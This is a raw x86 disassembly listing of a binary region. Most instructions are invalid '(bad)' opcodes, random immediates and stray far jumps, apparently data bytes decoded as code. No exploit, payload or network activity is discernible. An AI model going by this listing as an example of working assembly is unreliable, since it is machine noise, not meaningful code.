  42566a:	repz fimul DWORD PTR [edx+eax*2-0x2333b731]
  425672:	xor    BYTE PTR [edx-0x36],bh
  425675:	or     eax,0xa499a4bf
  42567a:	(bad)  
  42567b:	dec    ebp
  42567c:	jmp    0x424104c1
  425681:	sbb    eax,eax
  425683:	call   DWORD PTR [edi-0x72]
  425686:	cmp    DWORD PTR [eax],eax
  425688:	mov    ebx,0x7c6aa32c
  42568d:	jle    0x425641
  42568f:	jnp    0x425671
  425691:	test   edx,ebx
  425693:	lea    ecx,[ebp+0x1c]
  425696:	(bad)
  425699:	pop    ebx
  42569a:	sbb    al,0x92
  42569c:	repz std 
  42569e:	sub    edx,DWORD PTR [esi-0x5f]
  4256a1:	pop    ebp
  4256a2:	std    
  4256a3:	loope  0x4256bc
  4256a5:	jp     0x425639
  4256a7:	mov    ds:0xf2bb3df4,eax
  4256ac:	ja     0x4256f4
  4256ae:	retf   
  4256af:	out    dx,eax
  4256b0:	cmc    
  4256b1:	fcmovu st,st(2)
  4256b3:	lds    edi,FWORD PTR [edi]
  4256b5:	test   edx,0x865868ae
  4256bb:	mov    al,ds:0xb2cfd470
  4256c0:	mov    bh,0xa5
  4256c2:	aam    0x7a
  4256c4:	ds push ds
  4256c6:	xor    BYTE PTR [edi],cl
  4256c8:	nop
  4256c9:	push   es
  4256ca:	bound  eax,QWORD PTR [edi-0x64c97f52]
  4256d0:	(bad)  
  4256d1:	mov    ah,0x6b
  4256d3:	jo     0x4256de
  4256d5:	or     al,0x84
  4256d7:	outs   dx,DWORD PTR ds:[esi]
  4256d8:	ret    
  4256d9:	shr    DWORD PTR [ebx],cl
  4256db:	pop    esi
  4256dc:	fadd   DWORD PTR [esi-0x114bbe4c]
  4256e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256e3:	pushf  
  4256e4:	mov    ds:0x782e8fbb,eax
  4256e9:	enter  0xbd63,0x74
  4256ed:	push   0xffffffd8
  4256ef:	pop    ds
  4256f0:	mov    ecx,0xdd270c0a
  4256f5:	jno    0x4256ca
  4256f7:	adc    bl,ah
  4256f9:	les    esp,FWORD PTR [esi+0x77]
  4256fc:	sbb    eax,0x680c33cc
  425701:	popa   
  425702:	int3   
  425703:	rcr    dh,1
  425705:	sbb    al,BYTE PTR [ecx]
  425707:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425708:	mov    ecx,0x9d7a45fc
  42570d:	js     0x425700
  42570f:	sub    cl,cl
	...
  425771:	add    BYTE PTR [eax],al
  425773:	add    dh,dl
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0x6c463e74
  425783:	add    BYTE PTR [ebx+0x5000190],0x1
  42578a:	add    BYTE PTR [eax],al
  42578c:	out    0x7f,al
  42578e:	in     eax,dx
  42578f:	mov    al,bl
  425791:	push   cs
  425792:	sbb    ebx,edx
  425794:	(bad)  
  425795:	lar    esp,WORD PTR [esi]
  425798:	mov    al,0x34
  42579a:	mov    ebp,0x86763449
  42579f:	xor    DWORD PTR [edx+0x42ea981d],ecx
  4257a5:	or     edx,DWORD PTR [eax+0x7fc9f48d]
  4257ab:	scas   al,BYTE PTR es:[edi]
  4257ac:	mov    ebp,0x3e82aee
  4257b1:	call   0x3d0c3aae
  4257b6:	call   0x77ebb7bb
  4257bb:	cmp    al,0x89
  4257bd:	xchg   ecx,eax
  4257be:	cmp    eax,0x764241e1
  4257c3:	push   edx
  4257c4:	nop
  4257c5:	inc    edi
  4257c6:	loopne 0x4257fd
  4257c8:	fidiv  WORD PTR [ebx-0x27]
  4257cb:	xchg   esp,eax
  4257cc:	push   ss
  4257cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257ce:	fistp  DWORD PTR [edx+0x3af62297]
  4257d4:	ret    
  4257d5:	mov    al,0x78
  4257d7:	mov    ch,BYTE PTR [edx-0x3e]
  4257da:	bound  esp,QWORD PTR [ebx-0x35]
  4257dd:	inc    ebp
  4257de:	mov    ds:0x415015fa,eax
  4257e3:	jle    0x42578c
  4257e5:	mov    bh,BYTE PTR [edx+ebp*2+0x2]
  4257e9:	int3   
  4257ea:	call   0xd2950619
  4257ef:	popf   
  4257f0:	mov    ds:0x55a5aadd,eax
  4257f5:	nop
  4257f6:	js     0x42578c
  4257f8:	mov    eax,ds:0x8aa0ac72
  4257fd:	pop    ds
  4257fe:	es dec ecx
  425800:	stos   BYTE PTR es:[edi],al
  425801:	pop    ebp
  425802:	sbb    al,0x93
  425804:	or     al,0xe2
  425806:	cmp    BYTE PTR [eax+edx*4+0x1ff17453],0xf7
  42580e:	mov    ds:0x1f17800,al
  425813:	cli    
  425814:	add    cl,BYTE PTR [ecx+0x17]
  425817:	jne    0x425891
  425819:	es dec edi
  42581b:	xor    cl,BYTE PTR [esi-0x30]
  42581e:	xlat   BYTE PTR ds:[ebx]
  42581f:	mov    ds:0x6d90fe51,al
  425824:	sub    BYTE PTR [ebx-0x4fab7963],cl
  42582a:	push   eax
  42582b:	ds int3 
  42582d:	and    DWORD PTR [edx+0x7a],ebp
  425830:	es inc edx
  425832:	xchg   esi,eax
  425833:	fldenv [edi-0x75]
  425836:	push   ds
  425837:	test   BYTE PTR ds:0x7862baf8,dl
  42583d:	sbb    bh,BYTE PTR [edi]
  42583f:	or     DWORD PTR [esi-0x8f1ebec],0xffffffa3
  425846:	push   ebp
  425847:	xchg   edx,eax
  425848:	mov    edi,0x14cecab1
  42584d:	stos   BYTE PTR es:[edi],al
  42584e:	fdiv   DWORD PTR [esi-0x6242a8e4]
  425854:	popa   
  425855:	inc    esi
  425856:	jle    0x4257ea
  425858:	test   al,0xec
  42585a:	test   BYTE PTR [edx+0x6f],dh
  42585d:	push   ds
  42585e:	mov    ch,0xf9
  425860:	outs   dx,BYTE PTR ds:[esi]
  425861:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425862:	call   0xe9774315
  425867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425868:	sub    BYTE PTR [esi+0x163976f],al
  42586e:	lods   al,BYTE PTR ds:[esi]
  42586f:	sbb    ecx,edi
  425871:	shl    DWORD PTR [edi-0x7],1
  425874:	mov    edx,0xefe88ac5
  425879:	fistp  QWORD PTR [ebx+eiz*1-0x1f84c48]
  425880:	in     al,0x71
  425882:	push   ebx
  425883:	scas   eax,DWORD PTR es:[edi]
  425884:	arpl   bx,bx
  425886:	enter  0xb6f8,0x24
  42588a:	gs jmp 0xde:0x48a195a4
	...
  4258f2:	add    BYTE PTR [eax],al
  4258f4:	pop    esp
  4258f5:	push   edx
  4258f6:	nop
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	ins    BYTE PTR es:[edi],dx
  425901:	fld    TBYTE PTR [ebx+0x19188f6]
  425907:	add    BYTE PTR ds:0xe7000001,al
  42590d:	mov    ecx,DWORD PTR [esi-0x718846d3]
  425913:	leave  
  425914:	lock sbb al,0x51
  425917:	cdq    
  425918:	push   es
  425919:	fld    DWORD PTR [esi+0x72323414]
  42591f:	test   DWORD PTR [edx],edi
  425921:	(bad)  
  425922:	dec    cx
  425924:	mov    ebp,0xb69a04ad
  425929:	cmp    al,0xa9
  42592b:	jmp    0x425918
  42592d:	mov    dl,0xa5
  42592f:	ja     0x425980
  425931:	sbb    al,0x71
  425933:	cmp    bh,BYTE PTR [eax]
  425935:	sub    DWORD PTR [esp+eiz*8-0x4b6e93cf],ecx
  42593c:	nop    ebx
  42593f:	inc    edx
  425940:	jmp    0x4258f2
  425942:	cwde   
  425943:	dec    edi
  425944:	add    eax,0x9ae461ef
  425949:	jmp    0x4259a0
  42594b:	push   0x41bd37fc
  425950:	cmp    eax,0xf6c6ba87
  425955:	mov    ss,WORD PTR [ebp-0x6b]
  425958:	enter  0xb0b2,0xb0
  42595c:	push   cs
  42595d:	mov    WORD PTR [ebx],cs
  42595f:	xor    esi,ebp
  425961:	int    0x9c
  425963:	dec    ecx
  425964:	aaa    
  425965:	fs mov bl,0xab
  425968:	or     ch,dl
  42596a:	lods   eax,DWORD PTR ds:[esi]
  42596b:	test   BYTE PTR [ecx],0x8c
  42596e:	cwde   
  42596f:	test   DWORD PTR [edi],eax
  425971:	or     ch,BYTE PTR [esi+0x4bf3c57e]
  425977:	fisubr WORD PTR [ebx-0x53]
  42597a:	lods   eax,DWORD PTR ds:[esi]
  42597b:	xchg   ecx,eax
  42597c:	aas    
  42597d:	xchg   ecx,eax
  42597e:	inc    edi
  42597f:	sbb    ch,dl
  425981:	stc    
  425982:	int3   
  425983:	je     0x42595c
  425985:	(bad)  [edx+edi*8-0x3921f5cc]
  42598c:	sti    
  42598d:	mov    ebp,0x71185039
  425992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425993:	jl     0x4259fc
  425995:	sbb    DWORD PTR [ebp+0x40],esi
  425998:	mov    cl,0xad
  42599a:	sbb    bl,dl
  42599c:	and    eax,DWORD PTR [edx+0x36074a5c]
  4259a2:	je     0x42599e
  4259a4:	pushf  
  4259a5:	cs (bad) 
  4259a7:	fild   WORD PTR [ecx]
  4259a9:	cmp    bl,BYTE PTR [esi]
  4259ab:	loop   0x425941
  4259ad:	push   es
  4259ae:	and    eax,0x5936d396
  4259b3:	mov    ebp,0x898fefde
  4259b8:	push   ebx
  4259b9:	adc    DWORD PTR [ebp+0x1f],esp
  4259bc:	jb     0x42599f
  4259be:	mov    ch,0x5f
  4259c0:	push   esp
  4259c1:	dec    ebx
  4259c2:	xchg   ecx,eax
  4259c3:	pushf  
  4259c4:	xchg   edi,eax
  4259c5:	xchg   ecx,eax
  4259c6:	and    al,0xd5
  4259c8:	sub    BYTE PTR [ecx+edx*4-0x34ed3e26],dh
  4259cf:	enter  0x532b,0x9f
  4259d3:	add    edi,DWORD PTR [edx+0x5a13fe45]
  4259d9:	test   BYTE PTR ds:0xf69234d9,0x61
  4259e0:	stos   DWORD PTR es:[edi],eax
  4259e1:	out    0xa9,eax
  4259e3:	push   0x42d76fbf
  4259e8:	in     eax,0x55
  4259ea:	sbb    BYTE PTR [eax+0x6e],cl
  4259ed:	adc    bl,BYTE PTR [ebx]
  4259ef:	imul   eax,DWORD PTR [esi+edx*1-0x1d],0xaf79e1ee
  4259f7:	push   0xffffff80
  4259f9:	jbe    0x42597e
  4259fb:	jl     0x425a1e
  4259fd:	lods   eax,DWORD PTR ds:[esi]
  4259fe:	or     DWORD PTR [edx-0x79ea314],ebp
  425a04:	push   0x3e
  425a06:	jb     0x425a22
  425a08:	sub    ebp,ecx
  425a0a:	pop    ss
  425a0b:	inc    DWORD PTR [esi]
  425a0d:	cmp    BYTE PTR [edi+eax*8],ah
  425a10:	push   ss
	...
  425a71:	add    BYTE PTR [eax],al
  425a73:	add    cl,al
  425a75:	arpl   WORD PTR [edi+eiz*2],ax
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4+0x553b94cc]
  425a84:	lea    edx,[edx+0x1050001]
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	(bad)  
  425a8d:	aas    
  425a8e:	add    al,0xf7
  425a90:	mov    esi,0xbaac641c
  425a95:	call   0x8e8f6d64
  425a9a:	div    DWORD PTR [esi+0x6eb0f03]
  425aa0:	add    ecx,DWORD PTR [ecx+ebx*4-0x29940fe3]
  425aa7:	sub    al,0xec
  425aa9:	dec    ebp
  425aaa:	aas    
  425aab:	mov    al,0xe1
  425aad:	mov    al,ds:0x5fed54b
  425ab2:	hlt    
  425ab3:	push   0x6a776f22
  425ab8:	data16 test BYTE PTR [ecx+esi*4],dh
  425abc:	pop    ebx
  425abd:	inc    esi
  425abe:	shl    ch,0x58
  425ac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ac2:	shl    DWORD PTR [ecx-0x77],cl
  425ac5:	lock sbb edi,edx
  425ac8:	dec    esp
  425ac9:	xchg   ebx,eax
  425aca:	jbe    0x425a5f
  425acc:	inc    ebp
  425acd:	repnz or dl,BYTE PTR [edx+0x4b]
  425ad1:	mov    ch,0x6f
  425ad3:	jae    0x425a9c
  425ad5:	add    al,0x56
  425ad7:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ad9:	js     0x425a90
  425adb:	loopne 0x425afa
  425add:	push   ebx
  425ade:	shl    BYTE PTR [ecx-0x2a],cl
  425ae1:	sti    
  425ae2:	sub    BYTE PTR [ebx+0xd],ah
  425ae5:	cmp    edx,DWORD PTR ds:0x21b2
  425aea:	scas   eax,DWORD PTR es:[edi]
  425aeb:	outs   dx,DWORD PTR ss:[esi]
  425aed:	sbb    al,0x0
  425aef:	mov    eax,0x2f276487
  425af4:	inc    edi
  425af5:	xor    eax,0x2a8e2d55
  425afa:	dec    ebx
  425afb:	shr    BYTE PTR [edi],1
  425afd:	or     BYTE PTR [ecx+0x7121eb80],bh
  425b03:	rcl    DWORD PTR [edi],0xe7
  425b06:	das    
  425b07:	sub    ebp,DWORD PTR [edx-0x37]
  425b0a:	jns    0x425b34
  425b0c:	inc    edi
  425b0d:	jnp    0x425b69
  425b0f:	sbb    dl,BYTE PTR [eax]
  425b11:	jns    0x425ac0
  425b13:	in     eax,0x9a
  425b15:	call   0x8216d71e
  425b1a:	jmp    0x425b5d
  425b1c:	cmp    DWORD PTR [eax+0x45],esp
  425b1f:	std    
  425b20:	repnz jmp 0x1bcf:0x6dcdb59d
  425b28:	or     edx,DWORD PTR [edx]
  425b2a:	adc    ebp,DWORD PTR [edx]
  425b2c:	imul   DWORD PTR [ecx+0x17]
  425b2f:	das    
  425b30:	outs   dx,DWORD PTR ds:[esi]
  425b31:	mov    eax,0x7888e521
  425b36:	pop    ebx
  425b37:	add    eax,0xad88d902
  425b3c:	add    DWORD PTR [ecx-0x32],esi
  425b3f:	fadd   DWORD PTR [esi+0x228e6412]
  425b45:	sbb    BYTE PTR [ebp-0x5a],bh
  425b48:	push   esi
  425b49:	aad    0x1d
  425b4b:	(bad)  
  425b4c:	mov    dh,0x49
  425b4e:	mov    ds:0xb7ab4426,eax
  425b53:	aam    0xde
  425b55:	test   ch,0xe9
  425b58:	or     al,0x16
  425b5a:	add    al,al
  425b5c:	daa    
  425b5d:	jnp    0x425b74
  425b5f:	pop    es
  425b60:	ret    0xc4f3
  425b63:	gs inc ebp
  425b65:	mov    dl,0x8c
  425b67:	inc    edx
  425b68:	test   esp,ebx
  425b6a:	lods   al,BYTE PTR ds:[esi]
  425b6b:	pusha  
  425b6c:	adc    DWORD PTR [ecx+eax*2+0x72],eax
  425b70:	cmc    
  425b71:	mov    dh,0x39
  425b73:	retf   
  425b74:	enter  0xb4ec,0xa6
  425b78:	adc    DWORD PTR [ebx],edx
  425b7a:	mov    esi,0x9c16af0f
  425b7f:	inc    esi
  425b80:	xchg   esp,eax
  425b81:	cmp    bl,ch
  425b83:	sbb    al,0x2a
  425b85:	xor    cl,BYTE PTR [esi-0x5867bf17]
  425b8b:	pop    edi
  425b8c:	dec    ebx
  425b8d:	fadd   QWORD PTR [ecx]
  425b8f:	dec    eax
  425b90:	push   es
	...
  425bf1:	add    BYTE PTR [eax],al
  425bf3:	add    ah,al
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	clc    
  425c01:	push   esp
  425c02:	rol    ecx,1
  425c04:	xchg   edx,eax
  425c05:	xchg   ebx,eax
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    eax,0x3a000001
  425c0d:	cmp    edx,DWORD PTR [ebx]
  425c0f:	outs   dx,DWORD PTR ds:[esi]
  425c10:	mov    ebp,0xab91de16
  425c15:	sti    
  425c16:	hlt    
  425c17:	mov    BYTE PTR [edi+0x57164079],al
  425c1d:	sti    
  425c1e:	dec    ecx
  425c1f:	jae    0x425bb3
  425c21:	mov    ebx,0x2a170cde
  425c26:	adc    dl,BYTE PTR [esp+eax*2-0x4]
  425c2a:	fld    DWORD PTR [ebx]
  425c2c:	cmp    bl,ch
  425c2e:	xchg   edx,eax
  425c2f:	pop    ss
  425c30:	cs inc ecx
  425c32:	dec    esp
  425c33:	cwde   
  425c34:	mov    dl,0x68
  425c36:	jne    0x425bea
  425c38:	lods   eax,DWORD PTR ds:[esi]
  425c39:	xchg   esp,eax
  425c3a:	loop   0x425bea
  425c3c:	xchg   ebp,eax
  425c3d:	out    dx,eax
  425c3e:	lds    esi,FWORD PTR [edi+0x2f]
  425c41:	(bad)
  425c44:	xchg   esi,esp
  425c46:	dec    ebp
  425c47:	sti    
  425c48:	xor    edi,ebp
  425c4a:	xchg   edi,eax
  425c4b:	inc    ecx
  425c4c:	push   ds
  425c4d:	inc    esi
  425c4e:	retf   
  425c4f:	xchg   BYTE PTR [edx+0x4e],dl
  425c52:	and    ch,BYTE PTR [ebp+0x6d6b7d45]
  425c58:	pop    esi
  425c59:	and    eax,0xde8bdfe3
  425c5e:	ss adc eax,0xab03c52e
  425c64:	int    0x8a
  425c66:	inc    esp
  425c67:	dec    edx
  425c68:	cmc    
  425c69:	mov    ebx,0x89495e87
  425c6e:	aas    
  425c6f:	push   esi
  425c70:	inc    eax
  425c71:	icebp  
  425c72:	inc    edi
  425c73:	cs addr16 or eax,edi
  425c77:	(bad)  
  425c78:	fcomi  st,st(2)
  425c7a:	pop    edi
  425c7b:	inc    ebx
  425c7c:	xor    DWORD PTR [eax],ebp
  425c7e:	out    dx,al
  425c7f:	inc    ecx
  425c80:	fisttp DWORD PTR [edx]
  425c82:	cld    
  425c83:	stc    
  425c84:	xchg   edx,eax
  425c85:	inc    edi
  425c86:	mov    ah,BYTE PTR [ebx]
  425c88:	lods   eax,DWORD PTR ds:[esi]
  425c89:	(bad)  
  425c8a:	pop    edx
  425c8b:	clc    
  425c8c:	add    DWORD PTR [ebx-0x21a36e87],edx
  425c92:	jmp    0x425d10
  425c94:	jo     0x425c1e
  425c96:	xlat   BYTE PTR ds:[ebx]
  425c97:	jnp    0x425cd5
  425c99:	push   ss
  425c9a:	(bad)  
  425c9b:	sbb    ebp,DWORD PTR [edi-0x36]
  425c9e:	fimul  DWORD PTR [edi+0x67]
  425ca1:	outs   dx,DWORD PTR ds:[esi]
  425ca2:	xor    esp,DWORD PTR [eax]
  425ca4:	adc    DWORD PTR [esi],edx
  425ca6:	ror    BYTE PTR [eax-0x6],1
  425ca9:	js     0x425cd7
  425cab:	push   ebx
  425cac:	inc    ebx
  425cad:	inc    eax
  425cae:	push   eax
  425caf:	lock mov ds:0x58544adb,eax
  425cb5:	into   
  425cb6:	xlat   BYTE PTR ds:[ebx]
  425cb7:	xor    BYTE PTR [edx+0x6d],ch
  425cba:	(bad)
  425cbd:	and    DWORD PTR [eax-0x38f0128d],esp
  425cc3:	scas   eax,DWORD PTR es:[edi]
  425cc4:	mov    al,ds:0x17bc6c2b
  425cc9:	cmp    al,BYTE PTR [edi-0x7a979e49]
  425ccf:	push   ebx
  425cd0:	adc    esp,DWORD PTR [edx+0x524374f7]
  425cd6:	pop    ebx
  425cd7:	jl     0x425c89
  425cd9:	pop    es
  425cda:	inc    ebp
  425cdb:	mov    eax,0x8446486f
  425ce0:	outs   dx,DWORD PTR ds:[esi]
  425ce1:	mov    edi,0x26a5987e
  425ce6:	pop    ebp
  425ce7:	dec    edi
  425ce8:	loope  0x425c6f
  425cea:	mov    ch,0xbe
  425cec:	es pop ecx
  425cee:	(bad)  
  425cef:	repz adc bl,BYTE PTR [edx-0x6585902]
  425cf6:	in     al,0xa5
  425cf8:	mov    dh,0xe7
  425cfa:	sub    BYTE PTR [esi-0x369a9289],al
  425d00:	add    eax,0xffe264ed
  425d05:	(bad)  
  425d06:	leave  
  425d07:	popf   
  425d08:	add    edx,eax
  425d0a:	xchg   ebx,ebx
  425d0c:	push   ebx
  425d0d:	repnz (bad) [eax]
  425d10:	cdq    
	...
  425d71:	add    BYTE PTR [eax],al
  425d73:	add    bh,bh
  425d75:	lods   al,BYTE PTR ds:[esi]
  425d76:	fadd   QWORD PTR [edi]
  425d78:	fbstp  TBYTE PTR [edi-0x1]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0x950e8281,al
  425d84:	xchg   edi,eax
  425d85:	xchg   esp,eax
  425d86:	add    DWORD PTR [eax],eax
  425d88:	add    eax,0xb3000001
  425d8d:	inc    ebx
  425d8e:	mov    ds:0x176acd9b,al
  425d93:	sbb    al,0x27
  425d95:	mov    ds:0x367d2760,eax
  425d9a:	mov    esp,0xbe73f1ab
  425d9f:	jno    0x425d27
  425da1:	add    BYTE PTR [esi-0x8],bh
  425da4:	fcmovnb st,st(4)
  425da6:	mov    al,ds:0xd1f04098
  425dab:	cli    
  425dac:	(bad)  
  425dad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425dae:	popf   
  425daf:	cmp    al,0x59
  425db1:	push   ecx
  425db2:	and    al,0x7d
  425db4:	sub    esi,DWORD PTR ds:0xeb44544e
  425dba:	outs   dx,DWORD PTR ds:[esi]
  425dbb:	or     edx,DWORD PTR [edx-0x4e812e83]
  425dc1:	push   ds
  425dc2:	add    eax,ebp
  425dc4:	push   esi
  425dc5:	jg     0x425de4
  425dc7:	dec    eax
  425dc8:	push   esp
  425dc9:	in     al,dx
  425dca:	xchg   ecx,eax
  425dcb:	xchg   ebp,eax
  425dcc:	div    BYTE PTR fs:[edi+0x7054cd31]
  425dd3:	fisub  DWORD PTR [ecx]
  425dd5:	leave  
  425dd6:	(bad)  
  425dd7:	mov    ecx,0xa9402852
  425ddc:	push   ebp
  425ddd:	shl    BYTE PTR [eax-0x32],0x7b
  425de1:	sar    BYTE PTR [esi+0x69bc4c96],cl
  425de7:	add    BYTE PTR [ebp-0x117e7db6],cl
  425ded:	out    dx,eax
  425dee:	jne    0x425dc1
  425df0:	sbb    BYTE PTR [ecx+0x3ae5c057],dl
  425df6:	pop    edx
  425df7:	adc    eax,0x99f48476
  425dfc:	push   ss
  425dfd:	ret    
  425dfe:	mov    bh,dl
  425e00:	inc    eax
  425e01:	sahf   
  425e02:	shl    esp,1
  425e04:	data16 (bad) 
  425e06:	mov    dh,0x21
  425e08:	push   edx
  425e09:	push   ebp
  425e0a:	or     esi,DWORD PTR [edx+edx*1+0xa669f76]
  425e11:	push   edi
  425e12:	inc    esi
  425e13:	inc    eax
  425e14:	lahf   
  425e15:	xchg   ebx,eax
  425e16:	xchg   ecx,eax
  425e17:	jno    0x425dc0
  425e19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e1a:	ficomp DWORD PTR [esi+0x3f]
  425e1d:	popa   
  425e1e:	add    DWORD PTR [esi+0x17],eax
  425e21:	xor    DWORD PTR [ebx+0x52c3f6c],0xffffff80
  425e28:	aas    
  425e29:	in     al,dx
  425e2a:	adc    DWORD PTR [edx-0x64],esi
  425e2d:	or     al,0x3b
  425e2f:	stos   DWORD PTR es:[edi],eax
  425e30:	push   es
  425e31:	scas   al,BYTE PTR es:[edi]
  425e32:	in     al,0x37
  425e34:	test   eax,0xc9ec4d48
  425e39:	rol    BYTE PTR [ebp+0x41],1
  425e3c:	mov    al,0xa0
  425e3e:	call   0x485fb387
  425e43:	sar    BYTE PTR [ecx],0xc5
  425e46:	xchg   ecx,eax
  425e48:	push   cs
  425e49:	xor    eax,0x8f4002bc
  425e4e:	add    DWORD PTR [ebx-0xc58dca0],esi
  425e54:	xchg   DWORD PTR [ebx+0x4602bc9e],eax
  425e5a:	xor    DWORD PTR [esi+edi*8-0x196dbfc6],ebx
  425e61:	stos   DWORD PTR es:[edi],eax
  425e62:	inc    edx
  425e63:	in     eax,0x3c
  425e65:	aad    0xce
  425e67:	dec    edi
  425e68:	jb     0x425e31
  425e6a:	out    dx,al
  425e6b:	lods   al,BYTE PTR ds:[esi]
  425e6c:	out    0x0,al
  425e6e:	jl     0x425ec5
  425e70:	cmp    eax,0x3fbaea1a
  425e75:	cld    
  425e76:	inc    ecx
  425e77:	sbb    al,0xa1
  425e79:	dec    edi
  425e7a:	je     0x425ea1
  425e7c:	push   0x6c
  425e7e:	je     0x425e36
  425e80:	sbb    DWORD PTR [edi+0x41fef3b1],eax
  425e86:	lea    ebx,[ebp-0x3f2ffac7]
  425e8c:	lds    edi,FWORD PTR [eax+0x36b7b4]
	...
  425ef2:	add    BYTE PTR [eax],al
  425ef4:	(bad)  
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	imul   BYTE PTR [esi+0x51]
  425f03:	sbb    al,0x9c
  425f05:	xchg   ebp,eax
  425f06:	add    DWORD PTR [eax],eax
  425f08:	add    eax,0xa000001
  425f0d:	leave  
  425f0e:	loope  0x425f22
  425f10:	(bad)  
  425f11:	push   ecx
  425f12:	js     0x425f55
  425f14:	data16 std 
  425f16:	push   edi
  425f17:	mov    cl,0x52
  425f19:	popf   
  425f1a:	int    0x3a
  425f1c:	sahf   
  425f1d:	dec    ebp
  425f1e:	or     eax,0xff09e3ee
  425f23:	scas   eax,DWORD PTR es:[edi]
  425f24:	mov    esp,0x9e524f79
  425f29:	daa    
  425f2a:	xchg   ebp,eax
  425f2b:	mov    ebx,0x269b19e3
  425f30:	das    
  425f31:	and    BYTE PTR [ebx+0x395927e7],cl
  425f37:	and    al,BYTE PTR [esp+ebx*1+0x56]
  425f3b:	popa   
  425f3c:	mov    al,ds:0xa06944bb
  425f41:	inc    ecx
  425f42:	shl    BYTE PTR [edx],0x1
  425f45:	xchg   esi,eax
  425f46:	mov    eax,0x58a1c6e5
  425f4b:	dec    esi
  425f4c:	outs   dx,DWORD PTR ds:[esi]
  425f4d:	dec    edi
  425f4e:	adc    DWORD PTR [esi],0x6f
  425f51:	inc    esi
  425f52:	or     dh,BYTE PTR ds:[ecx+0x38]
  425f56:	jmp    0xeb64d142
  425f5b:	nop
  425f5c:	mov    ?,WORD PTR [edi+0x4e]
  425f5f:	inc    ebx
  425f60:	adc    eax,0x705e7df3
  425f65:	(bad)  
  425f66:	retf   
  425f67:	xor    DWORD PTR [edx+0x11],ecx
  425f6a:	xchg   ebp,eax
  425f6b:	and    DWORD PTR [eax-0x2ca7e775],0x2c528811
  425f75:	inc    ebx
  425f76:	sti    
  425f77:	pop    es
  425f78:	(bad)  
  425f79:	push   ecx
  425f7a:	or     al,0xd8
  425f7c:	pop    ecx
  425f7d:	shl    BYTE PTR [esi],0xcd
  425f80:	mov    edx,es
  425f82:	(bad)  
  425f83:	push   ds
  425f84:	lods   eax,DWORD PTR ds:[esi]
  425f85:	int3   
  425f86:	pop    esp
  425f87:	adc    al,0xfd
  425f89:	loop   0x425f29
  425f8b:	into   
  425f8c:	or     bh,BYTE PTR [ebx]
  425f8e:	je     0x425f2e
  425f90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f91:	mov    ds:0x9dfb15b4,eax
  425f96:	and    edi,ecx
  425f98:	aad    0xeb
  425f9a:	js     0x425f64
  425f9c:	push   ss
  425f9d:	out    0x4e,al
  425f9f:	adc    DWORD PTR [edi+0x37e5beaa],0xb3a76e29
  425fa9:	cdq    
  425faa:	add    ah,BYTE PTR [ebx-0x1e3e99a2]
  425fb0:	dec    ebp
  425fb1:	repz push 0x7c
  425fb4:	add    BYTE PTR [esi-0x4d],cl
  425fb7:	jl     0x425fcc
  425fb9:	sub    edx,DWORD PTR [ecx]
  425fbb:	jmp    0x425f9b
  425fbd:	sbb    DWORD PTR [edx],0xffffffa1
  425fc0:	shr    BYTE PTR [edx+0x11],0x3e
  425fc4:	stc    
  425fc5:	dec    edx
  425fc6:	or     bl,BYTE PTR [eax+0x614abec]
  425fcc:	fwait
  425fcd:	aaa    
  425fce:	addr16 mov bh,0xb7
  425fd1:	pusha  
  425fd2:	nop
  425fd3:	ror    esi,0xc3
  425fd6:	sub    eax,0xa5a4ec00
  425fdb:	in     eax,dx
  425fdc:	inc    edi
  425fdd:	leave  
  425fde:	xchg   ebp,eax
  425fdf:	push   es
  425fe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fe1:	dec    ax
  425fe3:	pop    edx
  425fe4:	pextrw edi,(bad),0xc5
  425fe6:	jg     0x425fb0
  425fe8:	jnp    0x425fae
  425fea:	fmul   QWORD PTR [edi+0x7a]
  425fed:	pop    ds
  425fee:	std    
  425fef:	lea    eax,[esi+0x476fa9be]
  425ff5:	jge    0x425f8e
  425ff7:	mov    cl,0xc4
  425ff9:	sbb    al,0x4b
  425ffb:	push   edx
  425ffc:	cmp    BYTE PTR [ecx+0x3e37624a],dh
  426002:	ret    0x8bad
  426005:	jmp    0x109560b3
  42600a:	js     0x426033
  42600c:	mov    eax,ds:0x8426f50b
	...
  426071:	add    BYTE PTR [eax],al
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	fcom   DWORD PTR [eax-0x695e59e2]
  426086:	add    DWORD PTR [eax],eax
  426088:	add    eax,0xc0000001
  42608d:	push   0x63
  42608f:	dec    ebx
  426090:	xor    eax,0x410b07b3
  426095:	popf   
  426096:	jle    0x426041
  426098:	aaa    
